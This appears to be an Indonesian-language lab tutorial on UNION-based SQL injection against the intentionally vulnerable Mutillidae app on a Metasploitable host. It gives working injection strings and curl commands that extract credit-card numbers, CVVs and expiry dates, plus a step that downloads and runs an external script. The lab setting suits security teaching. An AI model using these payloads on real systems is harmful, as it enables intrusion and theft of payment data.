# Mutillidae Lesson 8

### Union

- Pada server, ketikkan perintah dibawah
```
sudo mysql
```
- Lalu jalankan query berikut
```
show databases; //untuk melihat daftar database
use owasp10; //mengakses database owasp10
show tables; //untuk melihat daftar tabel
desc accounts; //untuk melihat tabel accounts
desc credit_cards; //untuk melihat tabel credit_cards
```
![](Mutillidae%20lesson%208/metasploit_1.png)
- Lalu jalankan query select menggunakan union
```
select * from accounts union select ccid,ccnumber,ccv,expiration,null from credit_cards;
```
![](Mutillidae%20lesson%208/metasploit_2.png)
- Hasilnya adalah tabel gabungan dari tabel accounts dan credit_cards. Tujuannya adalah untuk melihat isi dari tabel credit_cards dari query tabel accounts.


### Membuka Halaman User Info

- Pada client, buka mutillidae dari browser
```
http://[ip_metasploit]/mutillidae
```
- Buka halaman User Info
```
OWASP TOP 10 -> A1 - SQL Injection -> SQLi Extract Data -> User Info
```
![](Mutillidae%20lesson%208/1.png)

### SQL Injection (Contoh #1)
- Pada halaman User Info, lakukan inspect element pada form Name dan ubah nilai size menjadi 100.
```
"size=100"`
```
![](Mutillidae%20lesson%208/2.png)
- Isi form Name dengan string berikut
```
' union select null -- //selalu tambahkan spasi setelah "--"
```
- Klik View Account Details
![](Mutillidae%20lesson%208/4.png)
- Keterangan: Jumlah null melambangkan jumlah field pada tabel. 
- Hasil error disebabkan karena jumlah field tidak sesuai.


### SQL Injection (Contoh #2)
- Ulangi langkah pada inspect element
- Isi form Name dengan string berikut
```
' union select null,null,null,null,null -- //selalu tambahkan spasi setelah "--"
```
- Klik View Account Details
![](Mutillidae%20lesson%208/6.png)
- Keterangan: Untuk mengetahui jumlah field pada tabel dengan diulang dengan mencoba-coba hingga tidak terjadi error. Pada contoh diatas jumlah field-nya ada 5 sehingga ditulis null sebanyak 5.
- Hasilnya kosong karena nilai yang dimasukkan semuanya null.
![](Mutillidae%20lesson%208/7.png)

### SQL Injection (Contoh #3)
- Ulangi langkah pada inspect element
- Isi form Name dengan string berikut
```
' union select 1,2,3,4,5 -- //selalu tambahkan spasi setelah "--"
```
- Klik View Account Details
![](Mutillidae%20lesson%208/8.png)
- Keterangan: Tujuannya adalah untuk mencari tahu urutan field pada tabel. Urutan field username, password, dan signature didapatkan sesuai dengan nilai yang dimasukkan.
![](Mutillidae%20lesson%208/9.png)

### SQL Injection (Contoh #4)
- Ulangi langkah pada inspect element
- Isi form Name dengan string berikut
```
' union select ccid,ccnumber,ccv,expiration,null from credit_cards --  //selalu tambahkan spasi setelah "--"
```
- Klik View Account Details
![](Mutillidae%20lesson%208/10.png)
- Keterangan: Tujuannya adalah untuk mencari mengambil nilai dari tabel credit_cards sesuai dengan urutannya.
- Hasil :
```
Username berisi ccnumber
Password berisi ccv
Signature berisi expiration
```
![](Mutillidae%20lesson%208/11.png)

### SQL Injection (Contoh #5)
- Tujuannya sama dengan Contoh #4 dengan perbedaan pada metode yang menggunakan curl.
- Buka terminal dan jalankan perintah dibawah
```
curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://[ip_metasploit]/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'
```
![](Mutillidae%20lesson%208/12.png)
- Maka hasilnya akan sama dengan Contoh #4.
![](Mutillidae%20lesson%208/13.png)
- Untuk menyimpan hasil kedalam sebuah file jalankan perintah berikut
```
curl -b crack_cookies.txt -c crack_cookies.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+union+select+ccid%2Cccnumber%2Cccv%2Cexpiration%2Cnull+from+credit_cards+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://[ip_metasploit]/mutillidae/index.php" | grep -i "Username="  > lesson8.txt
cat lesson8.txt
```
![](Mutillidae%20lesson%208/14.png)
- Karena hasilnya susah dibaca, download dan jalankan output parser
```
cd /root
wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson8/lesson8.pl.TXT
mv lesson8.pl.TXT lesson8.pl
chmod 700
lesson8.pl
./lesson8.pl
```
![](Mutillidae%20lesson%208/16.png)
![](Mutillidae%20lesson%208/17.png)
